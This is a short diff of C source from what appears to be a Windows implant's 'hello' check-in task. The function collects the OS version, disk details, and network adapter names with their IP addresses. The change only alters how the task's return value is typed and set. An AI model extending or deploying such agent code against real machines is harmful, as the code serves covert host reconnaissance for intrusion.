@@ -45,7 +45,7 @@ D_SEC( B ) DWORD TaskHello( _In_ PROGUE_CTX Context, _In_ PVOID Buffer, _In_ UIN
 	TASK_HELLO_BUF		Thb;
 	RTL_OSVERSIONINFOW	Ver;
 
-	BOOL			Ret = FALSE;
+	DWORD			Ret = 1;
 
 	PCHAR			Dsk = NULL;
 	PBUFFER			Out = NULL;
@@ -92,7 +92,8 @@ D_SEC( B ) DWORD TaskHello( _In_ PROGUE_CTX Context, _In_ PVOID Buffer, _In_ UIN
 								BufferPrintf( Out, C_PTR( G_PTR( "%s:%s;" ) ), Nxt->Description, Nxt->IpAddressList.IpAddress.String );
 							};
 						};
-						Ret = BufferAddRaw( Output, Out->Buffer, Out->Length );
+						/* Add output and set return value */
+						Ret = BufferAddRaw( Output, Out->Buffer, Out->Length ) != TRUE ? 1 : 0;
 					};
 					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Pai );
 					Pai = NULL;
